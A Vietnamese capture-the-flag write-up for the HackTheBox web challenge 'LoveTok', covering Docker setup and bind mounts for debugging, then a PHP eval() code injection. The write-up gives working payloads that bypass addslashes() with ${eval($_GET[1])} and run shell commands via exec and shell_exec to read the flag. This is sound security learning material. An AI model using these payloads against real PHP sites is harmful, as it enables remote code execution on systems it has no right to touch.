---
title: Docker, debug, first challenge from HTB
tags: write-up, HTB, blog
---


[toc]
# Lời mở đầu
Sau khoảng hơn 3 tháng chăm chỉ nghiên cứu về web trên PortSwigger, mình quyết định sẽ test thử những gì mình đã học được bằng một challenge easy trên HackTheBox. Đây là một challenge web white box, đòi hỏi phải có kỹ năng dựng docker, debug, phân tích source code web,... Và đó cũng là những nội dung mình sẽ chia sẻ trong bài viết này.
# 1. Tải source code
![image](https://hackmd.io/_uploads/SyTeYmoEp.png)

Sau khi tải về và giải nén, mình được folder `web_lovetok` chứa các tập tin sau

![image](https://hackmd.io/_uploads/ByfBcXoE6.png)

Ngay khi nhìn thấy `Dockerfile` thì mình biết mình cần phải dùng docker để dựng được challenge web này lên
# 2. Dựng docker
## Yêu cầu:
Ở đây là một số cái mình đã cài đặt trước đó để có thể thực hiện được challenge này:
- Docker Desktop (https://www.docker.com/products/docker-desktop/)
- Docker Desktop WSL 2 backend (https://docs.docker.com/desktop/wsl/)
- Ubuntu on WSL 2 (https://linuxsimply.com/wsl2-install-ubuntu/)
## Docker là gì?
![image](https://hackmd.io/_uploads/BJA4u7j4a.png)
Docker là một công cụ giúp đóng gói ứng dụng (trang web) và các thành phần liên quan của nó vào một gói gọi là `container`. Container này chứa tất cả những gì cần thiết để ứng dụng của bạn chạy một cách độc lập trên bất kỳ máy tính nào.

## Xây dựng docker container
Để xây dựng một Docker container, bạn cần thực hiện các bước sau:
- **Bước 1: Tạo Dockerfile** 
Dockerfile là một tệp văn bản đặc biệt chứa các chỉ thị và hướng dẫn cho Docker để xây dựng container. Trong Dockerfile, bạn sẽ chỉ định các bước để cài đặt các thành phần phụ thuộc và cấu hình cho ứng dụng (trang web) của bạn.
- **Bước 2: Viết các chỉ thị trong Dockerfile** 
Trong Dockerfile, bạn sử dụng các chỉ thị như `FROM, RUN, COPY, EXPOSE` để mô tả các bước xây dựng container
**Ví dụ :** `FROM` sẽ chỉ định image cơ sở mà container của bạn sẽ dựa trên, `RUN` sẽ thực thi các lệnh trong container, `COPY` sẽ sao chép các tệp tin từ máy tính của bạn vào container, và `EXPOSE` sẽ định cấu hình các cổng mà container sẽ lắng nghe.
- **Bước 3: Xây dựng container** 
Sau khi bạn đã tạo Dockerfile, bạn có thể sử dụng lệnh `docker build` để xây dựng container từ Dockerfile của bạn. Lệnh này sẽ đọc Dockerfile, tải xuống các image cần thiết và thực hiện các bước xây dựng được chỉ định trong Dockerfile
- **Bước 4: Kiểm tra và chạy container:** 
Sau khi quá trình xây dựng hoàn tất, bạn có thể sử dụng lệnh `docker run` để chạy container. 

Như vậy với `Dockerfile` có sẵn trong folder `web_lovetok` ta có thể bỏ qua bước 1,2

![image](https://hackmd.io/_uploads/Sye1W4o4a.png)

Ngoài ra trong folder còn có sẵn file `build_docker.sh`, trong đó gồm các câu lệnh để build docker, run docker như bước 3,4

![image](https://hackmd.io/_uploads/rJpPWNo46.png)

Như vậy việc ta cần làm, chỉ cần mở terminal lên và thực thi file `build_docker.sh`

![image](https://hackmd.io/_uploads/B1wHM4jNp.png)

Sau khi việc thực thi file được hoàn tất và không có lỗi gì

![image](https://hackmd.io/_uploads/ByyY74j4a.png)

Ta mở một terminal khác và gõ lệnh 
```
docker ps
```
![image](https://hackmd.io/_uploads/r1xkEVoVp.png)

Để xem thông tin các container bao gồm `NAMES, CONTAINER ID, ...` và thông tin `PORT` để có thể kết nối

Ở đây để là `0.0.0.0:1337->80/tcp` nghĩa là trên máy host (máy tính của mình) khi truy cập đến localhost:1337 sẽ được chuyển hướng đến port 80 của container

![image](https://hackmd.io/_uploads/BkQa8Nj4a.png)

Nếu không sử dụng lệnh ta cũng có thể xem các thông tin này bằng Docker Desktop 

![image](https://hackmd.io/_uploads/rkRwH4oEp.png)

Dựng và truy cập trang web thành công

# 3. Set up để debug challenge

Debug là quá trình mà ta sẽ tìm hiểu thật kỹ ứng dụng hoạt động như nào, input nhập vào sẽ được biến đổi như thế nào, đi về đâu, ... Cách đơn giản nhất để debug là chèn các lệnh in (print statements) vào trong mã nguồn của chương trình để hiển thị quá trị của biến, thông điệp báo lỗi hoặc các thông tin khác trong quá trình chạy

Để thay đổi source code ta có thể sử dụng IDE trong Docker Desktop

![image](https://hackmd.io/_uploads/BJsuPEiVp.png)

Hoặc sử dụng tính năng mount volume của docker

## Storage trong Docker 
**Storage trong Docker** là một tính năng quản lý data của Docker. Data ở đây có thể hiểu là các file được sinh ra trong quá trình chạy ứng dụng - container như file log, file data, file report, ...

Docker Storage là một cơ chế cho phép lưu trữ các data của Container vào Docker Host bằng cách **mount** một folder từ Docker Container vào Docker Host.

## Các kiểu mount của Docker Storage

![image](https://hackmd.io/_uploads/SJk55EiNT.png)

Có 3 kiểu mount của Docker Storage đó là:

- **Volumes:** Mount-point sẽ nằm ở /var/lib/docker/volumes/ của Docker Host và được quản lý bằng Docker.
- **bind mounts:** Mount-point có thể nằm ở bất kỳ đâu Docker Host không được quản lý bởi Docker.
- **tmpfs mounts:** Data sẽ được lưu vào memory của Docker Host và sẽ mất đi khi khởi động lại hoặc stop container.

### Volumes
Về hoạt động Volume tương tự như Bind mounts, nhưng **Volume** được quản lý bời Docker. Trong khi bind mounts, file hoặc folder cần mount phải được tồn tại trên Docker host

Ta có thể tạo một volume và chạy container mount với volume đó bằng lệnh sau:

```bash=
docker run -itd -v my-volume:/opt/mount_point/ image_name
# Hoặc 
docker run -itd --mount type=volume,src=my-volume,dst=/opt/mount_point/ image_name
# Hoặc
docker run -itd --mount type=volume,source=my-volume,target=/opt/mount_point/ image_name
```

Một vấn đề khi mình tạo volume xong là mình hoàn toàn không biết volume này nằm ở đâu :upside_down_face: nên mình cũng chỉ có thể chỉnh sửa thông qua IDE của Docker Desktop => Chưa nhìn thấy tác dụng lắm.

Nên mình có tìm hiểu thêm và quyết định sử dụng bind mount

### Bind mounts

Lệnh:

```bash=
docker run --name container_name -v /path/to/folder_host:/path/to/folder_container image_name
```
Lưu ý khi sử dụng bind mount:
- Khi sử dụng bind mounts và flag -mount thì phải đảm bảo file hoặc folder từ docker host đã dược tồn tại. Vì nếu file hoặc folder trống nó sẽ lấy nội dung từ Docker Host ghi vào Docker Container => những dữ liệu trong Container có thể bị mất và Container sẽ không hoạt động bình thường

## Copy rồi Bind mount :3 

Đầu tiên mình xác định folder mình muốn chỉnh sửa trong Container là `/www`, đây cũng chính là source của trang web nếu thay đổi nội dung ở đây, trang web cũng sẽ thay đổi

Như đã nói ở trên nếu sử dụng Bind mount, mình cần phải đảm bảo có dữ liệu trong folder Host, nếu không, folder `/www` trong Container sẽ bị ghi đè trống trơn => web sập :)))

Cách ở đây mình áp dụng để không bị mất file là sau khi `docker run` mình sẽ tiến hành copy folder `/www` tron Container sang Host bằng lệnh sau:

```bash=
docker cp lovetok:/www /home/cheese/web_lovetok/www
# docker cp name_container:/path/folder/in_container /path/folder/in_host
```

Sau đó mình sử dụng bind mount để chạy một container mới và bind folder mình vừa copy ra Host vào Container đó

```bash=
 docker run -p 13370:80 --name lovetok2 -v /home/cheese/web_lovetok/www:/www lovetok
```
Trong đó:
- `- p 13370:80` để bind port ở localhost là 13370
- `--name` chỉ định tên của container
- `-v /home/cheese/web_lovetok/www:/www` bind mount
- `lovetok` là image name được build từ Dockerfile

Lúc này mình có thể dùng IDE ưa thích của mình SublimeText để edit folder `/home/cheese/web_lovetok/www`

![image](https://hackmd.io/_uploads/SJMyaroN6.png)

Sau khi lưu lại nội dung sẽ được đồng bộ với Container

![image](https://hackmd.io/_uploads/rJzmpSiET.png)

# 3. Phân tích và debug challenge

**Chức năng của trang web:**
- Dự đoán ngày mà ta sẽ tìm thấy tình yêu bằng cách random một khoảng thời gian bất kỳ
- Khi tải lại trang web thì ta sẽ nhận được một khoảng thời gian khác 

![image](https://hackmd.io/_uploads/HkEtgIsNa.png)

Khi click vào `Nah, that doesn't ...` thì trang web sẽ được reload lại kèm theo tham số `format`

![image](https://hackmd.io/_uploads/HJxJ-Uj4a.png)

**Phân tích source code:**

***TimeController.php***

```php=
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

Controller này chịu trách nhiệm 
- GET tham số `format` trong URL 
- Truyền tham số này để khởi tạo đối tượng `TimeModel`
- `$time->getTime()` gọi đến hàm getTime()

***TimeModel.php***

```php=
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

Khi khởi tạo đối tượng TimeMode, `__construct` sẽ chịu trách nhiệm:
- `addslashes($format)` rồi gán nó vào thuộc tính `$this->format`
- Tiến hành random `$d, $h, $m, $s` rồi gán vào `$this->prediction` ở dạng chuỗi

Khi hàm `getTime()` được gọi:
- Nó sẽ dùng hàm eval để thực thi câu lệnh bên trong nhằm mục đích tạo ra biến `$time` chứa giá trị
- Nếu có `$time` thì return `$time`, không thì return `Something went terribly wrong`

***Hàm eval()***

Trong đoạn code ta có thể thấy sự xuất hiện của một hàm khá nguy hiểm là **eval()**

![image](https://hackmd.io/_uploads/B1ZE8tsNT.png)

**eval()** chịu trách nhiệm thực thi chuỗi mà nó được truyền vào như một dòng code PHP

![image](https://hackmd.io/_uploads/SJJcDYiN6.png)

Như vậy nếu ta có thể truyền tham số cho `eval()` thì ta có thể thực thi bất kỳ dòng code nào mà ta muốn

```php!
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```
Ở dòng code này ta nhìn thấy 2 vấn đề hoặc tiềm năng :smiley:
- Chuỗi được truyền cho `eval()` thực hiện nối chuỗi với `$this->format` và `$this->prediction` nếu điều khiển được 2 thuộc tính này ta có thể khai thác theo hướng **`Code Injection`**
- `$this->format` có thể được điều khiển từ bên ngoài vì đây là tham số `format` được lấy trên URL, ta có thể gửi bất kỳ dữ liệu gì cho tham số này

Giả sử:

**$this->format="`"); echo(exec('whoami'));#`"**

Thì chuỗi truyền vào eval() sẽ là:
```php!
$time = date(""); echo(exec('whoami'));#'", strtotime ...
```
Như thế thì ta sẽ thực thi được dòng code mà mình muốn. Tuy nhiên là ...

![image](https://hackmd.io/_uploads/SJSGJ9iE6.png)

Khi thử nhập payload vào URL thì kết quả lại không như thế :thinking_face: . Để tìm hiểu vấn đề gì xảy ra ta sẽ thử chỉnh source của chương trình để 
- Xem input của ta đã bị biến đổi như nào?
- Xem chuỗi được truyền cho eval chính xác là gì?
- Nếu câu eval bị lỗi thì in lỗi ra màn hình

Source code sau khi chỉnh lại để debug sẽ trông như sau:

```php=
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        #1. echo format sau khi addslashes
        echo('format after addslashes(): '.$this->format);
        echo('<br>');

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        #eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');

        #2. echo câu lệnh hoàn chỉnh trước khi truyền cho eval()
        echo ('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        echo('<br>');

        #3. set error handler và dùng try catch để in lỗi nếu lệnh eval() không thực thi được
        set_error_handler(function($_errno, $errstr) {
            // Convert notice, warning, etc. to error.
            throw new Error($errstr);
        });

        try {
            eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        } catch (Throwable $e) {
            echo 'Caught exception: ',  $e->getMessage(), "\n";
        }
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

Và vì phần CSS của challenge khá nhức mắt với mình nên mình quyết định comment luôn phần CSS, cũng như không cho trang web load hình và ta được kết quả như sau 

![image](https://hackmd.io/_uploads/BJbS8ciET.png)

`$this->format` lúc này xuất hiện thêm ký tự `\` ở trước `" và '`

***Hàm addslashes()***

![image](https://hackmd.io/_uploads/HJISD5jE6.png)

Hàm này chịu trách nhiệm thêm `\` vào trước các ký tự `',",\, NUL byte` có trong chuỗi. Nó sẽ làm cho dòng code hiểu các ký tự này là một phần của chuỗi, ký tự kết thúc chuỗi. Cho nên cách khai thác này đã bị chặn :slightly_smiling_face: 

# 4. Bypass addslashes()

Sau một lúc google để tìm cách bypass addslashes thì mình tìm được bài viết sau:

https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php

Dựa theo bài viết, ta biết được payload `${phpinfo()}` không hề bị chặn vì nó không chứa các ký tự cần phải thêm `\`, nhưng khi đưa vào hàm `eval()` thì sẽ thực thi được hàm `phpinfo()`.

Test thử payload :smiley: 

![image](https://hackmd.io/_uploads/rJxnCqoN6.png)

Nó thực sự hoạt động :o !!

**Phân tích payload:**

Sau khi tìm hiểu thì mình biết được **`${}`** hay còn gọi là **dollar sign curly bracket** hay là **simple syntax** trong PHP. Nó cung cấp một cách để *nhúng một biến*, *một giá trị mảng* hoặc một *thuộc tính đối tượng* vào một chuỗi mà không tốn nhiều công sức.

Ta có thể sử dụng simple syntax như sau:
```php=
$name = 'PHP';
echo "Hello {$name}"; // Hello PHP
echo "Hello ${name}"; // Hello PHP
```
Nhưng từ PHP 8.2 trở đi ta chỉ có thể sử dụng `${name}`

Tuy nhiên khi thử `{$phpinfo()}` thì payload lại không hoạt động dù phiên bản PHP của challenge là 7.4 ??!! :face_with_monocle: 

![image](https://hackmd.io/_uploads/H15NaisNa.png)

Và sau khi test thử trên https://onlinephp.io/ với version PHP 7.4

![image](https://hackmd.io/_uploads/HJJCpjiNT.png)

Ta có thể thấy nếu ghi là `{$phpinfo()}` PHP chỉ hiểu biến là `phpinfo` bỏ qua dấu `()` từ đó không hiểu `phpinfo` là biến nào như báo lỗi của challenge *Undefined variable: phpinfo* hoăc báo lỗi liên quan đến cách gọi function như trong PHP sandbox *Function name must be a string*

Như vậy ta có thể dùng **simple syntax** **`${}`** để nhúng một biến vào chuỗi hoặc nhúng giá trị trả về của một hàm vào chuỗi

Tiếp tục dựa vào bài viết bypass phía trên, ta có thể thấy payload sau:

```
${eval($_GET[1])}=123)&1=phpinfo()
```

Payload này sẽ thực thi hàm eval() và chuỗi truyền vào cho eval là tham số `1` được gửi kèm theo trong URL, và giá trị của tham số `1` này chính là `phpinfo()`. Nghĩa là 

```
${eval($_GET[1])}=123)&1=phpinfo() ~~ eval(phpinfo())
```

Từ đó ta có thể nghĩ đến ý tưởng sau:
- **`${}`** có thể nhúng giá trị của một biến
- **`$_GET[1]`** chính là một biến =)))
- Ta cũng có thể tùy ý điều khiển tham số **`1`** được gửi kèm trong URL

=> Ta có thể gửi các ký tự `',",\` mà không bị ảnh hưởng bởi **addslashes()**

## Payload sai lần 1:

```
{$_GET[1]}&1=phpinfo()
```
![image](https://hackmd.io/_uploads/SyC-rniET.png)

:x: Payload này không hoạt động vì sau khi truyền được `phpinfo()` vào `$_GET[1]` thì simple syntax đã xong nhiệm vụ của nó nên lúc nào `phpinfo()` chỉ đơn giản là một chuỗi. Ta có thể so sánh nó với khi `format=phpinfo()`

![image](https://hackmd.io/_uploads/rJsQH2sV6.png)

## Payload sai lần 2:

Cải cách từ lần sai 1 ta sẽ thêm một lồng payload 1 vào một simple syntax khác

```
${$_GET[1]}&1=phpinfo()
```
![image](https://hackmd.io/_uploads/S1MkwhiE6.png)

:x: Cái này vẫn sai vì do `$_GET[1]` nên `phpinfo()` lúc này là một chuỗi chứ không phải hàm nữa :v Ta có thể thấy báo lỗi là không biết biến `phpinfo()`

## Payload sau n lần sai

Tới bước này mình mới chợt nhận ra là `eval()` trong source code đã được thực thi nên mới có 

```php=
$time = date("{$_GET[1]}", strtotime("+3 day +20 hour +42 minute +63 second"));
```

Nên ta cần phải chèn thêm một hàm eval khác để có thể thực thi được :smiley: 

Và `eval()` cũng có thể return giá trị nên ta có thể chèn `eval()` vào `${}`

![image](https://hackmd.io/_uploads/H1-KYnjET.png)

Ta cần phải chèn payload để đoạn code phải trông như thế này

```php=
$time = date("{eval($_GET[1])}", strtotime("+3 day +20 hour +42 minute +63 second"));
```

Và ta sẽ truyền dòng code mà mình muốn thực thi vào tham số `1`

Payload:

```
${eval($_GET[1])}&1=echo%20"AAAAAA";
```
![image](https://hackmd.io/_uploads/r1qO52sEa.png)

Bingo :grinning_face_with_star_eyes: 

## Payload tìm flag

Mình chỉ cần thực thi lệnh `exec()` để tìm flag trên server. Nhưng kết quả có làm mình hơi thắc mắc

Mình thực hiện câu lệnh `echo(exec('ls /'));`

![image](https://hackmd.io/_uploads/SyNIh2iEa.png)

Nhưng kết quả lại chỉ có `www` trong khi trên server lại có rất nhiều file :face_with_monocle: 

![image](https://hackmd.io/_uploads/B1f4a3s4a.png)

Và mình tìm hiểu được rằng `exec()` sẽ chỉ trả về dòng cuối cùng trong output, còn `shell_exec()` sẽ trả về tất cả output dưới dạng 1 chuỗi :3 

![image](https://hackmd.io/_uploads/SJAc63oN6.png)

Tìm thấy file flag rồi thì cat flag thui

![image](https://hackmd.io/_uploads/HyTzAhoVp.png)

# 5. Lấy flag ở server HTB

Làm tương tự với server của HTB

![image](https://hackmd.io/_uploads/BypGlTs46.png)

![image](https://hackmd.io/_uploads/SyQUgTi4a.png)

:::success
**Solved** :+1: 
:::

# Nguồn tham khảo:

https://stackoverflow.com/questions/42848279/how-to-mount-volume-from-container-to-host-in-docker

https://docs.docker.com/engine/reference/commandline/cli/

https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php

https://stackoverflow.com/questions/5571624/what-does-mean-in-php-syntax

https://php.watch/versions/8.2/$%7Bvar%7D-string-interpolation-deprecated

https://stackoverflow.com/questions/7093860/php-shell-exec-vs-exec
